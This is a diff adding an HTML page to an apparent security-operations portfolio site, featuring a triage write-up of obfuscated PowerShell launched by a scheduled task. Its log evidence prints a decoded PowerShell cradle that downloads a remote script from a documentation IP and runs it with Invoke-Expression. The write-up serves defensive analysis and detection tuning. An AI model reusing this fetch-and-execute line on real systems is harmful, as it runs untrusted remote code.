@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Investigations & Threat Triage | Privacy Skill Vault</title>
+  
+  <meta name="description" content="Structured walkthroughs of alert triage, raw log correlation, and forensic analysis across simulated threat scenarios.">
+  <meta property="og:title" content="Operational Investigations & Threat Triage | Privacy Skill Vault">
+  <meta property="og:description" content="Documenting investigation methodologies, detection logic, and false-positive reduction.">
+  <meta property="og:type" content="website">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <link rel="stylesheet" href="assets/css/style.css">
+  <link rel="stylesheet" href="assets/css/responsive.css">
+  <link rel="stylesheet" href="assets/css/animations.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+  <!-- GLOBAL NAVBAR -->
+  <header class="navbar">
+    <div class="max-container nav-wrapper">
+      <a href="index.html" class="brand-logo">
+        <i class="fa-solid fa-shield-halved brand-logo-icon"></i>
+        <div>
+          <div class="brand-title">PRIVACY <span style="color: var(--accent-blue);">SKILL VAULT</span></div>
+          <div class="brand-subtitle">Security Operations | Investigations | Lab Testing</div>
+        </div>
+      </a>
+
+      <nav class="nav-links">
+        <a href="index.html">Home</a>
+        <a href="investigations.html" class="active">Investigations</a>
+        <a href="fraud-analysis.html">Fraud Analysis</a>
+        <a href="lab-setup.html">Lab Setup</a>
+        <a href="tools.html">Tools</a>
+        <a href="about.html">About</a>
+      </nav>
+
+      <div style="color: var(--text-muted); cursor: pointer;">
+        <i class="fa-solid fa-magnifying-glass"></i>
+      </div>
+    </div>
+  </header>
+
+  <!-- MAIN CONTENT CONTAINER -->
+  <main class="max-container" style="padding-top: 2.5rem; padding-bottom: 3rem;">
+
+    <!-- 1. HEADER & INTRO SECTION -->
+    <section style="margin-bottom: 2rem;">
+      <span style="font-size: 0.75rem; font-weight: 700; letter-spacing: 0.1em; color: var(--cyan-glow); text-transform: uppercase;">
+        INVESTIGATIONS
+      </span>
+      <h1 style="font-size: 2.25rem; line-height: 1.2; margin-top: 0.5rem; margin-bottom: 0.75rem;">
+        Operational Investigations & Threat Triage
+      </h1>
+      <p style="color: var(--text-muted); font-size: 0.875rem; line-height: 1.6; max-width: 900px;">
+        Structured walkthroughs of alert triage, raw log correlation, and forensic analysis across simulated threat scenarios[cite: 4]. Documenting investigation methodologies, detection logic, and false-positive reduction[cite: 4].
+      </p>
+    </section>
+
+    <!-- 2. INTERACTIVE CATEGORY FILTER BAR -->
+    <section style="margin-bottom: 2rem;">
+      <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; align-items: center;">
+        <button class="btn btn-primary" style="padding: 0.35rem 0.85rem; font-size: 0.75rem;">All</button>
+        <button class="btn btn-secondary" style="padding: 0.35rem 0.85rem; font-size: 0.75rem;">SIEM & Log Analysis</button>
+        <button class="btn btn-secondary" style="padding: 0.35rem 0.85rem; font-size: 0.75rem;">Network & PCAP</button>
+        <button class="btn btn-secondary" style="padding: 0.35rem 0.85rem; font-size: 0.75rem;">Endpoint Telemetry</button>
+        <button class="btn btn-secondary" style="padding: 0.35rem 0.85rem; font-size: 0.75rem;">False Positives</button>
+      </div>
+    </section>
+
+    <!-- 3. FEATURED CASE STUDY -->
+    <section class="section-card" style="margin-bottom: 3rem;">
+      <div class="flex-between" style="border-bottom: 1px solid var(--border-color); padding-bottom: 1rem; margin-bottom: 1.5rem; flex-wrap: wrap; gap: 0.75rem;">
+        <div>
+          <span style="font-size: 0.7rem; color: var(--cyan-glow); font-weight: 700; letter-spacing: 0.05em; text-transform: uppercase;">
+            ★ FEATURED CASE STUDY — ID: INV-024
+          </span>
+          <h2 style="font-size: 1.35rem; margin-top: 0.25rem;">
+            Investigating Obfuscated PowerShell Execution via Scheduled Tasks
+          </h2>
+        </div>
+        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; align-items: center;">
+          <span style="background: rgba(245, 158, 11, 0.1); color: var(--amber-alert); border: 1px solid rgba(245, 158, 11, 0.25); font-size: 0.65rem; font-weight: 700; padding: 0.25rem 0.5rem; border-radius: 0.25rem;">
+            Severity: Medium
+          </span>
+          <span style="background: rgba(16, 185, 129, 0.1); color: var(--emerald-success); border: 1px solid rgba(16, 185, 129, 0.25); font-size: 0.65rem; font-weight: 700; padding: 0.25rem 0.5rem; border-radius: 0.25rem;">
+            Status: Closed / Resolved
+          </span>
+          <span style="background: rgba(56, 189, 248, 0.1); color: var(--cyan-glow); border: 1px solid rgba(56, 189, 248, 0.25); font-size: 0.65rem; font-weight: 700; padding: 0.25rem 0.5rem; border-radius: 0.25rem;">
+            Category: Host Telemetry & SIEM
+          </span>
+        </div>
+      </div>
+
+      <div class="grid-2" style="gap: 1.5rem; font-size: 0.825rem;">
+        
+        <!-- Left Column -->
+        <div style="display: flex; flex-direction: column; gap: 1.25rem;">
+          <div style="background: var(--bg-surface-alt); padding: 1.25rem; border-radius: 0.5rem; border: 1px solid var(--border-color);">
+            <h3 style="color: var(--cyan-glow); font-size: 0.95rem; margin-bottom: 0.75rem; border-bottom: 1px solid rgba(22, 43, 84, 0.6); padding-bottom: 0.35rem;">
+              1. Incident Trigger & Initial Context
+            </h3>
+            <ul style="list-style: none; display: flex; flex-direction: column; gap: 0.5rem; color: var(--text-muted);">
+              <li><strong style="color: #fff;">Alert Name:</strong> SUSPICIOUS_POWERSHELL_BASE64_EXEC</li>
+              <li><strong style="color: #fff;">Trigger Source:</strong> Windows Security Event Log (Event ID 4688) on endpoint HOST-FIN-02.</li>
+              <li><strong style="color: #fff;">Initial Observation:</strong> An automated SIEM alert flagged an obfuscated PowerShell command executing under the SYSTEM account outside standard maintenance hours.</li>
+            </ul>
+          </div>
+
+          <div style="background: var(--bg-surface-alt); padding: 1.25rem; border-radius: 0.5rem; border: 1px solid var(--border-color);">
+            <h3 style="color: var(--cyan-glow); font-size: 0.95rem; margin-bottom: 0.75rem; border-bottom: 1px solid rgba(22, 43, 84, 0.6); padding-bottom: 0.35rem;">
+              3. Investigation & Triage Workflow
+            </h3>
+            <ol style="margin-left: 1.2rem; color: var(--text-muted); display: flex; flex-direction: column; gap: 0.6rem;">
+              <li><strong style="color: #fff;">Payload Decoding:</strong> Extracted the Base64 string from Sysmon Event ID 1 and decoded the payload using CyberChef to identify the outbound destination.</li>
+              <li><strong style="color: #fff;">Parent-Child Process Analysis:</strong> Verified that powershell.exe was spawned directly by taskeng.exe (Windows Scheduled Tasks Engine), confirming automated persistence rather than interactive execution.</li>
+              <li><strong style="color: #fff;">Network Telemetry Correlation:</strong> Cross-referenced network firewall logs for outbound connections to 192.0.2.45. Identified 12 outbound connection attempts within a 3-minute window.</li>
+              <li><strong style="color: #fff;">Host Verification:</strong> Interviewed the system administration team and checked local task scheduler definitions. Confirmed an unannounced legacy maintenance script was executing without updated service account encapsulation.</li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- Right Column -->
+        <div style="display: flex; flex-direction: column; gap: 1.25rem;">
+          <div style="background: var(--bg-surface-alt); padding: 1.25rem; border-radius: 0.5rem; border: 1px solid var(--border-color);">
+            <h3 style="color: var(--cyan-glow); font-size: 0.95rem; margin-bottom: 0.75rem; border-bottom: 1px solid rgba(22, 43, 84, 0.6); padding-bottom: 0.35rem;">
+              2. Telemetry & Log Evidence
+            </h3>
+            <p style="font-size: 0.75rem; color: var(--text-muted); margin-bottom: 0.5rem;"><strong style="color: #fff;">Sysmon Event ID 1 (Process Creation):</strong></p>
+            <div class="code-container" style="margin-bottom: 1rem;">
+              <button onclick="copySnippet(this)" class="copy-btn">Copy</button>
+              <pre><code>UtcTime: 2026-07-12 02:14:08.112
+ProcessId: 4820
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine: powershell.exe -NoP -NonI -W Hidden -e aXdX... [Base64 Truncated]
+ParentImage: C:\Windows\System32\taskeng.exe
+User: NT AUTHORITY\SYSTEM</code></pre>
+            </div>
+
+            <p style="font-size: 0.75rem; color: var(--text-muted); margin-bottom: 0.5rem;"><strong style="color: #fff;">Script Block Logging (Windows Event ID 4104) Decoded Payload:</strong></p>
+            <div class="code-container">
+              <button onclick="copySnippet(this)" class="copy-btn">Copy</button>
+              <pre><code>$cli = New-Object System.Net.WebClient
+$data = $cli.DownloadString('http://192.0.2.45/stage2.ps1')
+Invoke-Expression $data</code></pre>
+            </div>
+          </div>
+
+          <div style="background: var(--bg-surface-alt); padding: 1.25rem; border-radius: 0.5rem; border: 1px solid var(--border-color);">
+            <h3 style="color: var(--cyan-glow); font-size: 0.95rem; margin-bottom: 0.75rem; border-bottom: 1px solid rgba(22, 43, 84, 0.6); padding-bottom: 0.35rem;">
+              4. Root Cause & Detection Tuning
+            </h3>
+            <p style="color: var(--text-muted); margin-bottom: 0.75rem;">
+              <strong style="color: #fff;">Verdict:</strong> Authorized Administrator Misconfiguration (True Positive for policy violation, False Positive for active malware).
+            </p>
+            <strong style="color: #fff; font-size: 0.75rem; display: block; margin-bottom: 0.35rem;">Remediation & Detection Tuning:</strong>
+            <ul style="list-style: none; display: flex; flex-direction: column; gap: 0.35rem; color: var(--emerald-success);">
+              <li>✓ Reconfigured the admin task to run via a dedicated service account with restricted privileges.</li>
+              <li>✓ Updated the SIEM detection rule to alert specifically on unquoted administrative script paths while keeping base-64 PowerShell flags flagged for non-standard parent processes.</li>
+            </ul>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- 4. INVESTIGATION REPOSITORY GRID -->
+    <section class="space-y">
+      <div style="margin-bottom: 1.5rem;">
+        <h2 style="font-size: 1.35rem;">Investigation Repository Grid</h2>
+        <p style="color: var(--text-muted); font-size: 0.825rem; margin-top: 0.25rem;">Browse all published analysis reports, threat breakdowns, and detection notes.</p>
+      </div>
+
+      <div class="grid-3">
+        
+        <!-- Card 1 -->
+        <article class="section-card" style="padding: 1.5rem; display: flex; flex-direction: column; justify-content: space-between;">
+          <div>
+            <div class="flex-between" style="margin-bottom: 0.75rem;">
+              <span style="font-size: 0.65rem; color: var(--cyan-glow); font-weight: 700;" class="mono-font">[INV-023]</span>
+              <span style="background: rgba(56, 189, 248, 0.1); color: var(--cyan-glow); border: 1px solid rgba(56, 189, 248, 0.2); font-size: 0.6rem; padding: 0.15rem 0.4rem; border-radius: 0.2rem;">
+                SIEM Analysis
+              </span>
+            </div>
+            <h3 style="font-size: 1rem; line-height: 1.3; margin-bottom: 0.5rem;">
+              Analyzing Privilege Escalation via Token Manipulation
+            </h3>
+            <p style="font-size: 0.75rem; color: var(--text-muted); line-height: 1.5; margin-bottom: 1rem;">
+              Examining Windows Event ID 4672 and process access rights during unauthorized token impersonation attempts.
+            </p>
+          </div>
+          <div class="flex-between" style="border-top: 1px solid var(--border-color); padding-top: 0.75rem; font-size: 0.7rem; color: var(--text-muted);">
+            <span>May 18, 2026 • 12 min read</span>
+            <a href="#" style="color: var(--cyan-glow); font-weight: 600;">Read Investigation →</a>
+          </div>
+        </article>
+
+        <!-- Card 2 -->
+        <article class="section-card" style="padding: 1.5rem; display: flex; flex-direction: column; justify-content: space-between;">
+          <div>
+            <div class="flex-between" style="margin-bottom: 0.75rem;">
+              <span style="font-size: 0.65rem; color: var(--cyan-glow); font-weight: 700;" class="mono-font">[INV-022]</span>
+              <span style="background: rgba(168, 85, 247, 0.1); color: var(--purple-glow); border: 1px solid rgba(168, 85, 247, 0.2); font-size: 0.6rem; padding: 0.15rem 0.4rem; border-radius: 0.2rem;">
+                Network & PCAP
+              </span>
+            </div>
+            <h3 style="font-size: 1rem; line-height: 1.3; margin-bottom: 0.5rem;">
+              Detecting Beaconing Traffic Using Suricata & Zeek Logs
+            </h3>
+            <p style="font-size: 0.75rem; color: var(--text-muted); line-height: 1.5; margin-bottom: 1rem;">
+              Identifying periodic outbound connections and domain generation patterns from compromised hosts in a controlled lab environment.
+            </p>
+          </div>
+          <div class="flex-between" style="border-top: 1px solid var(--border-color); padding-top: 0.75rem; font-size: 0.7rem; color: var(--text-muted);">
+            <span>May 16, 2026 • 15 min read</span>
+            <a href="#" style="color: var(--cyan-glow); font-weight: 600;">Read Investigation →</a>
+          </div>
+        </article>
+
+        <!-- Card 3 -->
+        <article class="section-card" style="padding: 1.5rem; display: flex; flex-direction: column; justify-content: space-between;">
+          <div>
+            <div class="flex-between" style="margin-bottom: 0.75rem;">
+              <span style="font-size: 0.65rem; color: var(--cyan-glow); font-weight: 700;" class="mono-font">[INV-021]</span>
+              <span style="background: rgba(20, 184, 166, 0.1); color: var(--teal-glow); border: 1px solid rgba(20, 184, 166, 0.2); font-size: 0.6rem; padding: 0.15rem 0.4rem; border-radius: 0.2rem;">
+                Endpoint Telemetry
+              </span>
+            </div>
+            <h3 style="font-size: 1rem; line-height: 1.3; margin-bottom: 0.5rem;">
+              Malicious DLL Sideloading via Unsigned Service Execution
+            </h3>
+            <p style="font-size: 0.75rem; color: var(--text-muted); line-height: 1.5; margin-bottom: 1rem;">
+              Investigating DLL search order hijacking and service persistence using Sysmon and Windows Event Logs.
+            </p>
+          </div>
+          <div class="flex-between" style="border-top: 1px solid var(--border-color); padding-top: 0.75rem; font-size: 0.7rem; color: var(--text-muted);">
+            <span>May 12, 2026 • 14 min read</span>
+            <a href="#" style="color: var(--cyan-glow); font-weight: 600;">Read Investigation →</a>
+          </div>
+        </article>
+
+      </div>
+    </section>
+
+  </main>
+
+  <!-- GLOBAL FOOTER -->
+  <footer class="footer">
+    <div class="max-container flex-between">
+      <div>Copyright © 2026 Privacy Skill Vault. All rights reserved.</div>
+      <div style="display: flex; gap: 1.25rem;">
+        <a href="index.html">Home</a>
+        <a href="investigations.html">Investigations</a>
+        <a href="fraud-analysis.html">Fraud Analysis</a>
+        <a href="lab-setup.html">Lab Setup</a>
+        <a href="tools.html">Tools</a>
+        <a href="about.html">About</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="assets/js/main.js"></script>
+  <script src="assets/js/animations.js"></script>
+</body>
+</html>
